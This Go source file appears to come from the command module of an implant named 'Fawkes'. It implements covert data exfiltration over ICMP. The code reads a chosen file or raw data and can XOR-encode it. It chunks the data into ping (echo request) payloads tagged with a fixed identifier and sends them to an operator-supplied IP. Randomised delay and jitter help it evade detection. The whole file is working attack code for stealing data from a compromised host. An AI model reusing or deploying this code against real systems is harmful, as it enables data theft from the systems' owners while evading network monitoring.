package commands

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// icmpExfilArgs are parameters for the ICMP exfiltration action.
type icmpExfilArgs struct {
	Action    string `json:"action"`
	Target    string `json:"target"`     // Destination IP for ICMP packets
	File      string `json:"file"`       // File path to exfiltrate (mutually exclusive with data)
	Data      string `json:"data"`       // Raw string data to exfiltrate
	ChunkSize int    `json:"chunk_size"` // Bytes per ICMP payload (default: 1024, max: 1400)
	Delay     int    `json:"delay"`      // Min delay between packets in ms (default: 100)
	Jitter    int    `json:"jitter"`     // Max additional random delay in ms (default: 50)
	XORKey    int    `json:"xor_key"`    // Single-byte XOR key (0 = no encoding, default: 0)
}

// icmpExfilResult tracks exfiltration progress.
type icmpExfilResult struct {
	Target     string `json:"target"`
	FileName   string `json:"filename"`
	TotalSize  int    `json:"total_size"`
	ChunkSize  int    `json:"chunk_size"`
	TotalPkts  int    `json:"total_packets"`
	SentPkts   int    `json:"sent_packets"`
	Identifier string `json:"identifier"`
	XORKey     int    `json:"xor_key"`
}

const (
	icmpExfilMagic      = 0xFA57 // ICMP Identifier for Fawkes exfil
	icmpExfilMaxChunk   = 1400   // Stay under typical MTU
	icmpExfilMinChunk   = 64
	icmpExfilHeaderSize = 8 // header in first chunk: chunks(2) + size(4) + xor(1) + reserved(1)
)

// executeICMPExfil sends file data encoded in ICMP echo request payloads.
func executeICMPExfil(task structs.Task) structs.CommandResult {
	args, parseErr := requireParams[icmpExfilArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Target == "" {
		return errorResult("Error: target IP is required for ICMP exfiltration")
	}
	if args.File == "" && args.Data == "" {
		return errorResult("Error: file or data parameter is required")
	}

	// Defaults
	if args.ChunkSize <= 0 {
		args.ChunkSize = 1024
	}
	if args.ChunkSize > icmpExfilMaxChunk {
		args.ChunkSize = icmpExfilMaxChunk
	}
	if args.ChunkSize < icmpExfilMinChunk {
		args.ChunkSize = icmpExfilMinChunk
	}
	if args.Delay <= 0 {
		args.Delay = 100
	}
	if args.Jitter < 0 {
		args.Jitter = 0
	}
	if args.XORKey < 0 || args.XORKey > 255 {
		args.XORKey = 0
	}

	// Read data to exfiltrate
	var payload []byte
	var fileName string
	if args.File != "" {
		data, err := os.ReadFile(args.File)
		if err != nil {
			return errorf("Error reading file: %v", err)
		}
		payload = data
		fileName = filepath.Base(args.File)
	} else {
		payload = []byte(args.Data)
		fileName = "data.bin"
	}

	if len(payload) == 0 {
		return errorResult("Error: no data to exfiltrate (file is empty)")
	}

	// XOR encode if key is set
	if args.XORKey != 0 {
		xorKey := byte(args.XORKey)
		for i := range payload {
			payload[i] ^= xorKey
		}
	}

	// Build the exfil header (first chunk prefix)
	dataChunkSize := args.ChunkSize - icmpExfilHeaderSize
	if dataChunkSize < 1 {
		dataChunkSize = 1
	}
	totalChunks := (len(payload) + dataChunkSize - 1) / dataChunkSize
	if totalChunks > 65535 {
		return errorf("Error: file too large (%d bytes, max ~%dMB with chunk size %d)",
			len(payload), (65535*dataChunkSize)/(1024*1024), args.ChunkSize)
	}

	// Open raw ICMP connection
	conn, err := net.Dial("ip4:icmp", args.Target)
	if err != nil {
		return errorf("Error opening ICMP socket: %v (requires root/admin)", err)
	}
	defer conn.Close()

	result := icmpExfilResult{
		Target:     args.Target,
		FileName:   fileName,
		TotalSize:  len(payload),
		ChunkSize:  args.ChunkSize,
		TotalPkts:  totalChunks,
		Identifier: fmt.Sprintf("0x%04X", icmpExfilMagic),
		XORKey:     args.XORKey,
	}

	// Send chunks
	for seq := 0; seq < totalChunks; seq++ {
		start := seq * dataChunkSize
		end := start + dataChunkSize
		if end > len(payload) {
			end = len(payload)
		}
		chunk := payload[start:end]

		var pktPayload []byte
		if seq == 0 {
			// First packet includes header
			header := make([]byte, icmpExfilHeaderSize)
			binary.BigEndian.PutUint16(header[0:2], uint16(totalChunks))
			binary.BigEndian.PutUint32(header[2:6], uint32(len(payload)))
			header[6] = byte(args.XORKey)
			header[7] = 0 // reserved
			pktPayload = append(header, chunk...)
		} else {
			pktPayload = chunk
		}

		pkt := buildICMPEchoRequest(icmpExfilMagic, uint16(seq), pktPayload)
		if _, err := conn.Write(pkt); err != nil {
			return errorf("Error sending ICMP packet %d/%d: %v", seq+1, totalChunks, err)
		}
		result.SentPkts++

		// Delay with jitter
		delay := time.Duration(args.Delay) * time.Millisecond
		if args.Jitter > 0 {
			jitter, _ := rand.Int(rand.Reader, big.NewInt(int64(args.Jitter)))
			delay += time.Duration(jitter.Int64()) * time.Millisecond
		}
		time.Sleep(delay)
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// buildICMPEchoRequest constructs a raw ICMP Echo Request packet.
func buildICMPEchoRequest(identifier, sequence uint16, payload []byte) []byte {
	pkt := make([]byte, 8+len(payload))
	pkt[0] = 8 // Type: Echo Request
	pkt[1] = 0 // Code: 0
	// Checksum at [2:4] — computed after all fields set
	binary.BigEndian.PutUint16(pkt[4:6], identifier)
	binary.BigEndian.PutUint16(pkt[6:8], sequence)
	copy(pkt[8:], payload)

	cs := icmpChecksum(pkt)
	binary.BigEndian.PutUint16(pkt[2:4], cs)
	return pkt
}

// icmpChecksum computes the RFC 1071 checksum for an ICMP packet.
func icmpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum >> 16) + (sum & 0xFFFF)
	}
	return ^uint16(sum)
}

// icmpChunkCount returns the number of ICMP packets needed for the given data size.
func icmpChunkCount(dataSize, chunkSize int) int {
	effective := chunkSize - icmpExfilHeaderSize
	if effective < 1 {
		effective = 1
	}
	return (dataSize + effective - 1) / effective
}
